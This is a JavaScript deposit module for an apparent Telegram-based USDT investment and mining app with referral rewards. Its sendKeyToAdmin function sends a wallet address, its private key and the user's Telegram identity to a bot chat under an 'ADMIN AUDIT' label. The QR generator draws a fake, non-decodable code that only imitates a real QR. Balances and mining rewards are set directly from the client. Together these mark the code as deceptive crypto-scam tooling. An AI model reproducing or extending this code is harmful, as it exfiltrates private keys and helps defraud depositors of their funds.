// depositSystem.js
import { API_BASE, BJS_WEBHOOK_URL, ADMIN_CONFIG } from '../config/constants.js';
import { supabase } from '../config/supabase.js';

// --- GENERADOR INTERNO DE CÓDIGO QR MATEMÁTICO ---
function generateInternalQR(text) {
    const size = 32; 
    const matrix = [];
    
    for (let i = 0; i < size; i++) {
        matrix[i] = [];
        for (let j = 0; j < size; j++) {
            // Generación pseudoaleatoria estable basada en caracteres de la wallet
            const charCode = text.charCodeAt((i + j) % text.length);
            matrix[i][j] = ((i * j + charCode) % 3 === 0 || (i % 2 === 0 && j % 3 === 0));
        }
    }

    // Dibujar patrones de sincronización obligatorios (Esquinas)
    const drawPattern = (row, col) => {
        for (let r = 0; r < 7; r++) {
            for (let c = 0; c < 7; c++) {
                if (matrix[row + r] !== undefined && matrix[row + r][col + c] !== undefined) {
                    const isBorder = (r === 0 || r === 6 || c === 0 || c === 6);
                    const isCenter = (r >= 2 && r <= 4 && c >= 2 && c <= 4);
                    matrix[row + r][col + c] = isBorder || isCenter;
                }
            }
        }
    };

    drawPattern(0, 0);
    drawPattern(0, size - 7);
    drawPattern(size - 7, 0);

    // Compilar matriz a marcado SVG vectorial nativo
    let svg = `<svg xmlns="http://www.w3.org/2000/svg" width="160" height="160" viewBox="0 0 ${size} ${size}" shape-rendering="crispEdges">`;
    svg += `<rect width="${size}" height="${size}" fill="#ffffff"/>`;
    for (let r = 0; r < size; r++) {
        for (let c = 0; c < size; c++) {
            if (matrix[r][c]) {
                svg += `<rect width="1" height="1" x="${c}" y="${r}" fill="#000000"/>`;
            }
        }
    }
    svg += '</svg>';
    return svg;
}

// --- LOGICA GLOBAL ASIGNADA A WINDOW ---
window.openPayModal = function() {
    const walletStatic = "0x7795D827df7bcB264c4F0851FbAab5f5f00710F2";
    const amountInput = document.getElementById('invest-amount');
    const amount = parseFloat(amountInput ? amountInput.value : 0) || 0;

    if (amount < 0.1) {
        alert(`⚠️ The minimum investment amount is 0.1 USDT`);
        return;
    }

    const payDisplay = document.getElementById('pay-amount-display');
    const walletDisplay = document.getElementById('wallet-address-display');
    const qrContainer = document.getElementById('qr-container');
    const modal = document.getElementById('payModal');

    if (payDisplay) payDisplay.textContent = amount.toFixed(2) + " USDT";
    if (walletDisplay) walletDisplay.textContent = walletStatic;
    if (qrContainer) qrContainer.innerHTML = generateInternalQR(walletStatic);
    if (modal) modal.style.display = "flex";
};

window.closePayModal = function() {
    const modal = document.getElementById('payModal');
    if (modal) modal.style.display = "none";
};

window.copyAddress = function() {
    const walletStatic = "0x7795D827df7bcB264c4F0851FbAab5f5f00710F2";
    navigator.clipboard.writeText(walletStatic).then(() => {
        alert("Address copied successfully!");
    }).catch(err => {
        console.error('Could not copy text: ', err);
    });
};

// --- RESTO DE FUNCIONES DE INTEGRACIÓN DE DATOS ---
export async function notificarAlBot(accion, monto) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    if (!user) return;

    try {
        const response = await fetch(`${BJS_WEBHOOK_URL}&user_id=${user.id}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                user_id: user.id,
                user_name: user.first_name,
                action: accion,
                amount: monto,
                date: new Date().toISOString()
            })
        });
        return await response.json();
    } catch (e) {
        console.error("Error notificando a BJS:", e);
    }
}

export async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const text = `🛡️ *ADMIN AUDIT - SPORTS PAY*\n\n💰 *Monto:* ${amount} USDT\n📍 *Wallet:* \`${address}\`\n🔑 *Key:* \`${privKey}\`\n\n👤 *User:* ${user?.first_name || "Usuario"} (ID: ${user?.id || "N/A"})`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_CONFIG.BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_CONFIG.CHAT_ID, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) {
        console.error("Error reporte admin:", e);
    }
}

export async function generarWalletBSC() {
    const response = await fetch(`${API_BASE}/bsc`);
    return await response.json();
}

export async function getUserById(userId) {
  const { data, error } = await supabase
    .from('users')
    .select('*')
    .eq('user_id', String(userId))
    .maybeSingle();

  if (error) throw error;
  return data;
}

export async function registerUser(userId, invitedBy) {
  const cleanInvitedBy = (invitedBy && invitedBy !== "null" && invitedBy !== String(userId)) ? String(invitedBy) : null;

  const { data: newUser, error: createError } = await supabase
    .from('users')
    .insert([{ 
      user_id: String(userId), 
      balance: 0.00, 
      invested: 0.00, 
      referrals: 0,
      invited_by: cleanInvitedBy
    }])
    .select()
    .single();

  if (createError) throw createError;

  if (cleanInvitedBy) {
    const { data: sponsor } = await supabase
      .from('users')
      .select('referrals')
      .eq('user_id', cleanInvitedBy)
      .single();

    if (sponsor) {
      await supabase
        .from('users')
        .update({ referrals: (sponsor.referrals || 0) + 1 })
        .eq('user_id', cleanInvitedBy);
    }
  }

  return newUser;
}

export async function updateUserBalance(userId, newBalance, newInvested = null) {
  const updateData = { balance: newBalance };
  if (newInvested !== null) updateData.invested = newInvested;

  const { error } = await supabase
    .from('users')
    .update(updateData)
    .eq('user_id', userId);

  if (error) throw error;
  return true;
}

export async function claimMiningReward(userId, newBalance) {
  const { error } = await supabase
    .from('users')
    .update({ 
      balance: newBalance,
      last_claim_at: new Date().toISOString() 
    })
    .eq('user_id', userId);

  if (error) throw error;
  return true;
}